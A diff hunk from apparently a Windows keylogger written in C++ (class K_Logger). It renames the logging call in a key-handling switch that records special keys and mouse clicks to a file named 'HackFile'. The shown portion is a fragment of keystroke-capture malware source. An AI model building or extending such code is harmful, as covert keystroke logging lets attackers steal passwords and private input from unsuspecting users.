@@ -734,58 +734,58 @@ int K_Logger::SaveSymbol(WORD iKey)
 
 		case VK_ESCAPE:
 			std::cout << " *Esc* ";
-			WriteToFile(" *Esc* ");
+			WriteToDoc(" *Esc* ");
 			break;
 
 		case VK_UP:
 			std::cout << " btn_up ";
-			WriteToFile(" btn_up ");
+			WriteToDoc(" btn_up ");
 			break;
 
 		case VK_DOWN:
 			std::cout << " btn_down ";
-			WriteToFile(" btn_down ");
+			WriteToDoc(" btn_down ");
 			break;
 
 		case VK_LEFT:
 			std::cout << " btn_left ";
-			WriteToFile(" btn_left ");
+			WriteToDoc(" btn_left ");
 			break;
 
 		case VK_RIGHT:
 			std::cout << " btn_right ";
-			WriteToFile(" btn_right ");
+			WriteToDoc(" btn_right ");
 			break;
 
 		case VK_CONTROL:
 			std::cout << " btn_ctrl ";
-			WriteToFile(" btn_ctrl ");
+			WriteToDoc(" btn_ctrl ");
 			break;
 
 		case VK_INSERT:
 			std::cout << " Insert ";
-			WriteToFile(" Insert ");
+			WriteToDoc(" Insert ");
 			break;
 
 		case VK_DELETE:
 			std::cout << " *Delete* ";
-			WriteToFile(" Delete ");
+			WriteToDoc(" Delete ");
 			break;
 
 
 		case VK_RBUTTON:
 			std::cout << "*mouse_right*";
-			WriteToFile("*mouse_right*");
+			WriteToDoc("*mouse_right*");
 			break;
 
 		case VK_LBUTTON:
 			std::cout << "*mouse_left*";
-			WriteToFile("*mouse_left*");
+			WriteToDoc("*mouse_left*");
 			break;
 
 		default:
 			std::cout << "?";
-			WriteToFile("?");
+			WriteToDoc("?");
 			break;
 	}
 	return 0;
@@ -805,8 +805,6 @@ int main()
 	setlocale(LC_ALL, "ru");
 
 	LPCWSTR fileName = L"D:\\HackFile";
-
-
 	char key;
 
 	K_Logger kl;
